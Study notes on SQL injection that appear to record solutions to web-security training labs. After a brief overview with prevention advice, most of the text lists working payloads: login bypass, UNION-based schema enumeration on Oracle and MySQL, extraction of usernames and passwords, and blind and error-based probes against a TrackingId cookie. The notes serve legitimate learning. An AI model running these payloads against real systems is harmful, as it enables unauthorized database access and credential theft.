# SQL Injection

## What is it

User-controlled input is inserted into SQL queries.

## Example

SELECT * FROM users
WHERE username='$user'

## Impact

- Authentication bypass
- Data leakage
- Data modification

## Prevention

- Prepared Statements
- Parameterized Queries
- ORM

## What I learned

I learnt how UNION attacks work and how attackers enumerate database structures.

## Labs

#### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
#### SQL injection vulnerability allowing login bypass
- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
#### SQL injection attack, querying the database type and version on Oracle
- '+UNION+SELECT+'abc','def'+FROM+dual--
- '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
#### SQL injection attack, querying the database type and version on MySQL and Microsoft
- '+UNION+SELECT+'abc','def'--
- '+UNION+SELECT+@@version,+NULL#
#### SQL injection attack, listing the database contents on non-Oracle databases
- '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
- '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
- '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
#### SQL injection attack, listing the database contents on Oracle
- '+UNION+SELECT+'abc','def'+FROM+dual--
- '+UNION+SELECT+table_name,NULL+FROM+all_tables--
- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
- '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
#### SQL injection UNION attack, determining the number of columns returned by the query
- '+UNION+SELECT+NULL,NULL--
#### SQL injection UNION attack, finding a column containing text
- '+UNION+SELECT+'abcdef',NULL,NULL--
#### SQL injection UNION attack, retrieving data from other tables
- '+UNION+SELECT+'abc','def'--
- '+UNION+SELECT+username,+password+FROM+users--
#### SQL injection UNION attack, retrieving multiple values in a single column
- '+UNION+SELECT+NULL,'abc'--
- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
#### Blind SQL injection with conditional responses
- 'Welcome back' message is shown when the condition is true
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
- TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
#### Blind SQL injection with conditional errors
- Error displayed when the condition is false
- Reverse of conditional response
- TrackingId=xyz'||(SELECT CASE WHEN ( condition goes here ) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
#### Visible error-based SQL injection
- Let the verbose error tell the value of sensitive information
- TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
- Invalid input syntax for type integer: "xxx"
